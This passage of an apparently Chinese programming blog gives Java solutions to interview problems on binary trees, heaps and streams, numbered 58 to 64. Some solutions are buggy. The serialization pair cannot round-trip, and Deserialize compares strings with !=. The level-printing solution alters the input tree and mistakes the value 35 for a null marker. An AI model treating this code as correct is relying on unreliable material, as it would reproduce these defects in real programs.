class="comment">//二叉树的深拷贝</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> TreeNode <span class="title">copyTree</span><span class="params">(TreeNode pRoot)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pRoot == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode root = <span class="keyword">new</span> TreeNode(pRoot.val);</span><br><span class="line">        root.left = copyTree(pRoot.left);</span><br><span class="line">        root.right = copyTree(pRoot.right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//二叉树的镜像化</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">mirrorTree</span><span class="params">(TreeNode pRoot)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pRoot == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mirrorTree(pRoot.left);</span><br><span class="line">        mirrorTree(pRoot.right);</span><br><span class="line">        TreeNode temp;</span><br><span class="line">        temp = pRoot.left;</span><br><span class="line">        pRoot.left = pRoot.right;</span><br><span class="line">        pRoot.right = temp;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//比较原二叉树与镜像二叉树是否一致</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">compare</span><span class="params">(TreeNode one, TreeNode two)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (one == <span class="keyword">null</span> &amp;&amp; two == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (one != <span class="keyword">null</span> &amp;&amp; two != <span class="keyword">null</span> &amp;&amp; one.val == two.val) &#123;</span><br><span class="line">            <span class="keyword">return</span> compare(one.left, two.left) &amp;&amp; compare(one.right, two.right);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="59-按之字形顺序打印二叉树"><a href="#59-按之字形顺序打印二叉树" class="headerlink" title="59.按之字形顺序打印二叉树"></a>59.按之字形顺序打印二叉树</h3><h4 id="标签：【栈】【树】-1"><a href="#标签：【栈】【树】-1" class="headerlink" title="标签：【栈】【树】"></a>标签：【栈】【树】</h4><h4 id="题目描述-58"><a href="#题目描述-58" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>请实现一个函数按照之字形打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右至左的顺序打印，第三行按照从左到右的顺序打印，其他行以此类推。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class TreeNode &#123;</span></span><br><span class="line"><span class="comment">    int val = 0;</span></span><br><span class="line"><span class="comment">    TreeNode left = null;</span></span><br><span class="line"><span class="comment">    TreeNode right = null;</span></span><br><span class="line"><span class="comment">    public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt; Print(TreeNode pRoot) &#123;</span><br><span class="line">        ArrayList&lt;ArrayList&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//奇数层栈</span></span><br><span class="line">        Stack&lt;TreeNode&gt; stackodd = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        <span class="comment">//偶数层栈</span></span><br><span class="line">        Stack&lt;TreeNode&gt; stackeven = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">if</span> (pRoot != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stackodd.add(pRoot);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!stackodd.isEmpty() || !stackeven.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">//奇数层处理</span></span><br><span class="line">            <span class="keyword">if</span> (count % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                ArrayList&lt;Integer&gt; temp = <span class="keyword">new</span> ArrayList();</span><br><span class="line">                <span class="comment">//奇数层出栈</span></span><br><span class="line">                <span class="keyword">while</span> (!stackodd.isEmpty()) &#123;</span><br><span class="line">                    TreeNode root = stackodd.pop();</span><br><span class="line">                    temp.add(root.val);</span><br><span class="line">                    <span class="comment">//左孩子入偶数层栈</span></span><br><span class="line">                    <span class="keyword">if</span> (root.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        stackeven.push(root.left);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//右孩子入偶数层栈</span></span><br><span class="line">                    <span class="keyword">if</span> (root.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        stackeven.push(root.right);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!temp.isEmpty()) &#123;</span><br><span class="line">                    res.add(temp);</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">//偶数层处理</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                ArrayList&lt;Integer&gt; temp = <span class="keyword">new</span> ArrayList();</span><br><span class="line">                <span class="comment">//偶数层出栈</span></span><br><span class="line">                <span class="keyword">while</span> (!stackeven.isEmpty()) &#123;</span><br><span class="line">                    TreeNode root = stackeven.pop();</span><br><span class="line">                    temp.add(root.val);</span><br><span class="line">                    <span class="comment">//右孩子入奇数层栈</span></span><br><span class="line">                    <span class="keyword">if</span> (root.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        stackodd.push(root.right);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//左孩子入奇数层栈</span></span><br><span class="line">                    <span class="keyword">if</span> (root.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        stackodd.push(root.left);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!temp.isEmpty()) &#123;</span><br><span class="line">                    res.add(temp);</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="60-把二叉树打印成多行"><a href="#60-把二叉树打印成多行" class="headerlink" title="60.把二叉树打印成多行"></a>60.把二叉树打印成多行</h3><h4 id="标签：【树】【bfs】"><a href="#标签：【树】【bfs】" class="headerlink" title="标签：【树】【bfs】"></a>标签：【树】【bfs】</h4><h4 id="题目描述-59"><a href="#题目描述-59" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>从上到下按层打印二叉树，同一层结点从左至右输出。每一层输出一行。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class TreeNode &#123;</span></span><br><span class="line"><span class="comment">    int val = 0;</span></span><br><span class="line"><span class="comment">    TreeNode left = null;</span></span><br><span class="line"><span class="comment">    TreeNode right = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    ArrayList&lt;ArrayList&lt;Integer&gt;&gt; Print(TreeNode pRoot) &#123;</span><br><span class="line">        ArrayList&lt;ArrayList&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt;();</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        LinkedList&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">if</span> (pRoot != <span class="keyword">null</span>) &#123;</span><br><span class="line">            queue.offer(pRoot);</span><br><span class="line">            <span class="keyword">int</span> deep = deepth(pRoot);</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (!queue.isEmpty() &amp;&amp; count &lt;= (Math.pow(<span class="number">2</span>, deep) - <span class="number">1</span>)) &#123;</span><br><span class="line">                count++;</span><br><span class="line">                TreeNode temp = queue.poll();</span><br><span class="line">                list.add(temp.val);</span><br><span class="line">                <span class="keyword">if</span> (temp.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    queue.offer(temp.left);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    temp.left = <span class="keyword">new</span> TreeNode(<span class="string">'#'</span>);</span><br><span class="line">                    queue.offer(temp.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (temp.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    queue.offer(temp.right);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    temp.right = <span class="keyword">new</span> TreeNode(<span class="string">'#'</span>);</span><br><span class="line">                    queue.offer(temp.right);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; deep; i++) &#123;</span><br><span class="line">                <span class="keyword">int</span> persum = (<span class="keyword">int</span>) Math.pow(<span class="number">2</span>, i);</span><br><span class="line">                ArrayList&lt;Integer&gt; temp = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; persum; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (list.get(sum) != <span class="string">'#'</span>) &#123;</span><br><span class="line">                        temp.add(list.get(sum));</span><br><span class="line">                    &#125;</span><br><span class="line">                    sum++;</span><br><span class="line">                &#125;</span><br><span class="line">                res.add(temp);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//树的深度</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">deepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left = deepth(root.left);</span><br><span class="line">        <span class="keyword">int</span> right = deepth(root.right);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + (left &gt;= right ? left : right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="61-序列化二叉树"><a href="#61-序列化二叉树" class="headerlink" title="61.序列化二叉树"></a>61.序列化二叉树</h3><h4 id="标签：【树】【序列化】"><a href="#标签：【树】【序列化】" class="headerlink" title="标签：【树】【序列化】"></a>标签：【树】【序列化】</h4><h4 id="题目描述-60"><a href="#题目描述-60" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>请实现两个函数，分别用来序列化和反序列化二叉树</p><p>二叉树的序列化是指：把一棵二叉树按照某种遍历方式的结果以某种格式保存为字符串，从而使得内存中建立起来的二叉树可以持久保存。序列化可以基于先序、中序、后序、层序的二叉树遍历方式来进行修改，序列化的结果是一个字符串，序列化时通过 某种符号表示空节点（#），以 ！ 表示一个结点值的结束（value!）。</p><p>二叉树的反序列化是指：根据某种遍历顺序得到的序列化字符串结果str，重构二叉树。</p><p>例如，我们可以把一个只有根节点为1的二叉树序列化为”1,”，然后通过自己的函数来解析回这个二叉树</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class TreeNode &#123;</span></span><br><span class="line"><span class="comment">    int val = 0;</span></span><br><span class="line"><span class="comment">    TreeNode left = null;</span></span><br><span class="line"><span class="comment">    TreeNode right = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = -<span class="number">1</span>;</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line">    <span class="function">String <span class="title">Serialize</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"#"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//类似前序遍历的方式序列化</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span> + root.val + <span class="string">","</span> + Serialize(root.left) + Serialize(root.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">TreeNode <span class="title">Deserialize</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        String[] input = str.split(<span class="string">","</span>);</span><br><span class="line">        <span class="comment">//前序方式遍历的位置</span></span><br><span class="line">        count++;</span><br><span class="line">        TreeNode node = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (input[count] != <span class="string">"#"</span>) &#123;</span><br><span class="line">            node = <span class="keyword">new</span> TreeNode(Integer.parseInt(input[count]));</span><br><span class="line">            node.left = Deserialize(str);</span><br><span class="line">            node.right = Deserialize(str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="62-二叉搜索树的第K个结点"><a href="#62-二叉搜索树的第K个结点" class="headerlink" title="62.二叉搜索树的第K个结点"></a>62.二叉搜索树的第K个结点</h3><h4 id="标签：【树】-6"><a href="#标签：【树】-6" class="headerlink" title="标签：【树】"></a>标签：【树】</h4><h4 id="题目描述-61"><a href="#题目描述-61" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>给定一棵二叉搜索树，请找出其中的第k小的结点。例如， （5，3，7，2，4，6，8）    中，按结点数值大小顺序第三小结点的值为4。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class TreeNode &#123;</span></span><br><span class="line"><span class="comment">    int val = 0;</span></span><br><span class="line"><span class="comment">    TreeNode left = null;</span></span><br><span class="line"><span class="comment">    TreeNode right = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">//优先级队列保存结点值，堆顶是最小值</span></span><br><span class="line">    PriorityQueue&lt;Integer&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Integer&gt;();</span><br><span class="line">    <span class="comment">//保存值与结点之间的关联关系</span></span><br><span class="line">    HashMap&lt;Integer, TreeNode&gt; map = <span class="keyword">new</span> HashMap&lt;Integer, TreeNode&gt;();</span><br><span class="line"><span class="comment">//二叉搜索树的第K个结点</span></span><br><span class="line">    <span class="function">TreeNode <span class="title">KthNode</span><span class="params">(TreeNode pRoot, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        search(pRoot);</span><br><span class="line">        <span class="keyword">if</span> (k &lt;= <span class="number">0</span> || k &gt; queue.size()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; k; i++) &#123;</span><br><span class="line">            queue.poll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(queue.peek());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//中序遍历二叉搜索树得到一个排序的序列</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">search</span><span class="params">(TreeNode pRoot)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pRoot == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        search(pRoot.left);</span><br><span class="line">        queue.offer(pRoot.val);</span><br><span class="line">        map.put(pRoot.val, pRoot);</span><br><span class="line">        search(pRoot.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="63-数据流中的中位数"><a href="#63-数据流中的中位数" class="headerlink" title="63.数据流中的中位数"></a>63.数据流中的中位数</h3><h4 id="标签：【进制转化】【排序】【堆】"><a href="#标签：【进制转化】【排序】【堆】" class="headerlink" title="标签：【进制转化】【排序】【堆】"></a>标签：【进制转化】【排序】【堆】</h4><h4 id="题目描述-62"><a href="#题目描述-62" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。我们使用Insert()方法读取数据流，使用GetMedian()方法获取当前读取数据的中位数。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    PriorityQueue&lt;Integer&gt; minHeap = <span class="keyword">new</span> PriorityQueue&lt;&gt;();</span><br><span class="line">    PriorityQueue&lt;Integer&gt; maxHeap = <span class="keyword">new</span> PriorityQueue&lt;Integer&gt;(<span class="number">15</span>, <span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="comment">//降序，实现大顶堆</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer o1, Integer o2)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> o2 - o1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Insert</span><span class="params">(Integer num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (count % <span class="number">2</span> == <span class="number">0</span>) &#123;<span class="comment">//当数据总数为偶数时，新加入的元素，应当进入小根堆</span></span><br><span class="line">            <span class="comment">//（注意不是直接进入小根堆，而是经大根堆筛选后取大根堆中最大元素进入小根堆）</span></span><br><span class="line">            <span class="comment">//1.新加入的元素先入到大根堆，由大根堆筛选出堆中最大的元素</span></span><br><span class="line">            maxHeap.offer(num);</span><br><span class="line">            <span class="keyword">int</span> filteredMaxNum = maxHeap.poll();</span><br><span class="line">            <span class="comment">//2.筛选后的【大根堆中的最大元素】进入小根堆</span></span><br><span class="line">            minHeap.offer(filteredMaxNum);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//当数据总数为奇数时，新加入的元素，应当进入大根堆</span></span><br><span class="line">            <span class="comment">//（注意不是直接进入大根堆，而是经小根堆筛选后取小根堆中最大元素进入大根堆）</span></span><br><span class="line">            <span class="comment">//1.新加入的元素先入到小根堆，由小根堆筛选出堆中最小的元素</span></span><br><span class="line">            minHeap.offer(num);</span><br><span class="line">            <span class="keyword">int</span> filteredMinNum = minHeap.poll();</span><br><span class="line">            <span class="comment">//2.筛选后的【小根堆中的最小元素】进入大根堆</span></span><br><span class="line">            maxHeap.offer(filteredMinNum);</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Double <span class="title">GetMedian</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值</span></span><br><span class="line">        <span class="keyword">if</span> (count % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Double((minHeap.peek() + maxHeap.peek())) / <span class="number">2</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Double(minHeap.peek());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="64-滑动窗口的最大值"><a href="#64-滑动窗口的最大值" class="headerlink" title="64.滑动窗口的最大值"></a>64.滑动窗口的最大值</h3><h4 id="标签：【堆】【双指针】"><a href="#标签：【堆】【双指针】" class="headerlink" title="标签：【堆】【双指针】"></a>标签：【堆】【双指针】</h4><h4 id="题目描述-63"><a href="#题目描述-63" class="headerlink" 